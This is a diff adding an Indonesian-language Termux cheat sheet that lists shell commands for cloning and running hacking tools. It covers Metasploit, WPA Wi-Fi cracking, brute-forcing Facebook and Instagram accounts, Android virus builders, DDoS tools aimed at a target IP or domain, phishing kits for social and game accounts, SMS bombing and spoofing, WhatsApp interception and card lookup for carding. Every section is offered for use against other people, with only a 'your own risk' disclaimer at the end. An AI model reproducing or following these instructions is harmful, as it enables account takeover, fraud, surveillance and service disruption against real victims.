@@ -1,0 +1,317 @@
+Pertama tama gunakan tools ini:  (tanda $ tidak ditulis)
+$ pkg update && pkg upgrade
+$ pkg install git php curl -y
+$ pkg install python2
+$ pkg install apache2
+$ pkg install python
+$ pkg install php
+$ pkg install nano
+$ pkg install git
+$ pkg install wget
+$ pkg install toilet
+$ pkg install curl
+$ pkg install jq
+$ pkg install git
+$ pkg install clone
+>(ULANGI TULISAN ITU, TAPI PKG UBAH JADI APT)<
+______________________________________________
+Jika sudah, silahkan untuk memilih script
+--METASPLOIT--
+Metasploit adalah tools hacking yang dapat di gunakan untuk kegiatan seperti remote pc atau hp orang lain, membuat virus, menyadap dan lain sebagainya
+$ pkg install curl
+$ curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
+$ chmod +x metasploit.sh
+$ ./metasploit.sh
+--WIFITE--
+Wifite adalah salah satu tool yang berfungsi untuk wireless attack, seperti mengcrack atau membobol password wifi yang terkunci dengan wpa/wpa2
+$ git clone https://github.com/derv82/wifite
+$ cd wifite
+$ chmod 777 wifite.py
+$ python2 wifite.py
+--BRUTEFORCE--
+Bruteforce ini metode hacking yang dimana kita akan membuat suatu wordlist yang berisi kumpulan tebakan password, jika ada salah satu password yang sesuai makan akun bisa di dapatkan
+$ pkg install pip
+$ pip install wordlist
+$ pkg install worlist
+$ wordlist -h
+$ cd /sdcard
+$ cat pas.txt
+--MELACAK IP--
+$ git clone https://github.com/maldevel/IPGeolocation
+$ cd IPGeolocation
+$ chmod +x ipgeolocation.py
+$ pip install -r requirements.txt
+$ python ipgeolocation.py -m
+$ python ipgeolocation.py -t IPnya
+--HACK AKUN FB--
+$ pkg install python2-dev
+$ apt install wget
+$ dip2 install mechanize
+$ cd/sterage/emulated/0
+$ python2 fbbrute.py
+$ storage/emulated/0/password.txt
+--MEMBUAT VIRUS--
+$ git clone https://github.com/viruz09/CreaterVirus
+$ cd CreaterVirus
+$ python2 creater.py
+>(jika sudah membuat virus gunakan kode ini)<
+$ cd CreaterVirus
+$ cp namafile.apk /sdcard/
+--DDOS--
+DDOS berguna untuk menyerang website dengan memberikan traffic yang tinggi sehingga website tersebut down
+$ git clone https://github.com/4L13199/LITEDDOS
+$ python2 LITEDDOS.py [ip target atau domain] [port] [jumlah traffic]
+--SANTET ONLINE--
+Fitur
+-Create a Netcat Payload and Listener
+-Facebook Group Hijack Attack
+-SMS Bomber Attack Vectors
+-SMS Spoof Attack Vectors
+-Denial-of-Service Attack
+$ git clone https://github.com/Gameye98/santet-online
+$ cd santet-online
+$ python2 santet.py
+--TOOLS B4J1N94N--
+Fitur
+-Nyari CC buat carding
+-Spam akun gmail
+-Whois lookup
+-Dan ratusan tools lainnya
+$ git clone https://github.com/DarknessCyberTeam/B4J1N64Nv5
+$ cd B4J1N64Nv5
+$ sh B4J1N64N.sh
+--HACK AKUN GAME MOBILE LEGENDS--
+$ git clone https://github.com/Senitopeng/PhisingGame.git
+$ cd PhisingGame
+$ python2 phising.py
+>(lihat result)<
+$ cd PhisingGame
+$ cat buku.txt
+--BOBOL WIFI--
+Nyalakan terlebih dahulu jaringan hp dan buka wifi. Dan cari Wifi yang masih berpassword
+$ apt update && apt upgrade
+$ pkg install git
+$ git clone https://github.com/esc0rtd3w/wifi-hacker
+$ cd wifi-hacker/
+$ chmod +x wifi-hacker.sh
+$ ./wifi-hacker.sh
+Lalu pilih y dan tunggu beberapa detik kemudian pilih 2
+Lalu Buka menu wifi pada HP kamu. Tutup dan Buka lagi. Maka akan terhubung.
+>(Bisa Connect Wifi tapi tidak tahu passwordnya gaes)<
+--SPAM SMS GRAB--
+$ pkg install python2 git
+$ pip2 install requests
+$ git clone https://github.com/p4kl0nc4t/Spammer-Grab
+$ cd Spammer-Grab
+$ chmod +x spammer.py
+$ python2 spammer.py
+--TEMBAK XL--
+semacam kuota gratis
+$ pkg upgrade && update
+$ pkg install git python
+$ git clone https://github.com/albertoanggi/xl-py
+$ pip install -r requirements.txt
+$ chmod +x app.py
+$ python app.py
+--HACK INSTAGRAM--
+$ apt update && apt upgrade
+$ pkg install python git nano
+$ git clone https://github.com/avramit/instahack.git
+$ cd instahack
+$ pip install requests
+$ cd instahack
+$ nano pass.txt
+$ cat pass.txt
+$ python hackinsta.py
+--MELACAK--
+$ apt update
+$ apt upgrade
+$ pkg install python git
+$ git clone https://github.com/maldevel/IPGeoLocation
+$ cd IPGeoLocation
+$ chmod +x ipgeolocation.py
+$ pip install -r repuirements.txt
+$ python ipgeolocation.py -m
+$ python ipgeolocation.py -h
+$ python ipgeolocation.py -t 10.99.110.220
+>(Kemudian Copas semua tulisan yang ada di samping Google Maps)<
+--HACK FB TEMAN--
+$ apt update && apt upgrade
+$ pip2 install –upgrade pipi
+$ pip2 install requests
+$ pip2 install mechanize
+$ pkg install git
+$ git clone https://github.com/blackcodercrush/hack-facebook-teman
+$ cd hack-facebook-teman
+$ sh requests.sh
+$ python2 hack-fb.py
+--HACK FB TARGET--
+$ apt update && apt upgrade
+$ apt install git
+$ apt install python2
+$ pip2 install mechanize
+$ git clone https://github.com/FR13ND8/BRUTEFORCEnew,
+$ cd BRUTEFORCEnew
+$ sh new.sh
+--HACK AKUN IG--
+$ pkg install nano
+$ pkg install figlet
+$ pkg install python2
+$ pip2 install lolcat
+$ pkg install cowsay
+$ pkg install git
+$ git clone https://github.com/darkcurut08/darkcurut08
+$ cd darkcurut08
+$ sh Moreno77.sh
+--HACK FB--
+$ apt update && apt upgrade
+$ pkg ins toilet
+$ pkg ins figlet
+$ pkg ins ruby
+$ pkg ins gem
+$ gem ins lolcat
+$ pkg ins php
+$ pkg ins python2
+$ pkg ins git
+$ git clone https://github.com/Rusmana-ID/rus,
+$ cd rus
+$ sh v2.sh
+>(name:Anak PW:Bangsa)<
+--PHISING--
+$ pkg install curl
+$ pkg install python
+$ pkg install python2
+$ pkg install wget
+$ pkg install php
+$ git clone https://github.com/An0nUD4Y/SocialFish
+$ ls
+$ cd SocialFish
+$ ls
+$ pip2 install -r requirements.txt
+$ pip2 install requests
+$ python3 SocialFish.py
+--SPAM CHAT WA--
+$ git clone https://github.com/siputra12/prank.git
+$ cd prank
+$ ls
+$ php wa.php
+--PHISING GAME--
+>(mobile legends dan clash of clan)<
+$ apt upgrade -y
+$ pkg install python2 -y
+$ pkg install apache2
+$ pkg install php -y
+$ git clone https://github.com/Senitopeng/PhisingGame
+$ ls
+$ cd PhisingGame
+$ python2 phising.py
+--SADAP WA--
+$ pkg install curl
+$ git clone https://github.com/AndriGanz/whatshack
+$ cd whatshack
+$ ls
+$ sh whatshack.sh
+--UNINSTALL TOLL TERMUX--
+$ rm -rf toolsnya
+--DDOS--
+1. Hammer
+$ git clone https://github.com/cyweb/hammer (tekan enter)
+$ cd hammer (tekan enter)
+$ python hammer.py (tekan enter)
+$ python hammer.py -s [IP target] -p [port] -t 135 (tekan enter)   104.27.146.125
+2. Xerxes
+$ apt install git
+$ apt install clang
+$ git clone https://github.com/zanyarjamal/xerxes
+$ ls
+$ cd xerxes
+$ ls
+$ clang xerxes.c -o xerxes
+$ ls
+$ ./xerxes (nama website) 80
+3. Torshammer
+$ pkg update
+$ pkg install git
+$ apt install tor
+$ pkg install python2
+$ git clone https://github.com/dotfighter/torshammer.git
+$ ls
+$ cd torshammer
+$ python2 torshammer.py
+4. liteDDOS
+$ apt update
+$ apt upgrade
+$ pkg install git
+$ pkg install python2
+$ git clone https://github.com/4L13199/LITEDDOS
+$ cd LITEDDOS
+$ python2 liteDDOS.py
+--INFO ANDROID--
+$ pkg install neofetch
+$ neofetch
+--FOLLOWERS DAN LIKE IG BERTAMBAH--
+$ pkg install python2
+$ pkg install ruby
+$ gem install lolcat
+$ pkg install git
+$ git clone https://github.com/Hanzelnutt/instabot
+$ cd instabot
+$ ls
+$ pip2 install -r requirements.txt
+$ bash instabot
+--HACK FB--
+$ apt update && apt upgrade
+$ apt install python
+$ apt install python2
+$ apt install ruby
+$ apt install git
+$ apt install wget
+$ apt install curl
+$ pip2 install mechanize
+$ pip2 install requests
+$ git clone https://github.com/hnov7/mbf
+*tunggu hingga selesai,jika sudah selesai
+*silahkan buka tab baru atau new session lalu ketik :
+$ cd mbf
+$ python2 mbf.py
+--HACK GMAIL--
+$ apt-get update && apt-get upgrade
+$ apt-get install git
+$ apt-get install python python-pip python-setuptools
+$ pip install scapy
+$ git clone https://github.com/wifiphisher/wifiphisher.git
+$ cd wifiphisher<
+$ python setup.py install
+$ cd wifiphisher
+$ python wifiphisher
+--HACK FB--
+$ Apt update ( Enter )
+$ Apt upgrade ( Enter )
+$ Apt install python2 ( Enter )
+$ pip2 install urllib3 chardet certifi idna requests ( Enter )
+$ apt install openssl curl ( Enter )
+$ pkg install libcurl ( Enter )
+$ ln /sdcard ( Enter ) 
+$ cd /sdcard ( Enter )
+$ python2 fbbrute.py ( Enter )
+____________________________________________________________________________
+MASIH KURANG??
+--500+ SCRIPT/TOOLS TERMUX--
+$ apt-get update
+$ apt-get upgrade
+$ Pkg install python
+$ Pkg install python2
+$ pkg install git
+$ git clone https://github.com/Ranginang67/DarkFly-Tool
+$ cd DarkFly-Tool
+$ ls
+$ chmod +x *
+$ python2 install.py
+_______________________________________________________________________________
+GUNAKAN SCRIPT INI DENGAN BIJAK, APAPUN RESIKONYA ANDA SENDIRI YANG NANGGUNG
+/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+CREDIT:
+https://gist.github.com/arysandi/8d49c6cc91e3ecfcdc8c91d8abdd7450
+https://efyei.com/script-termux/
+PENULIS:
+GW SENDIRI
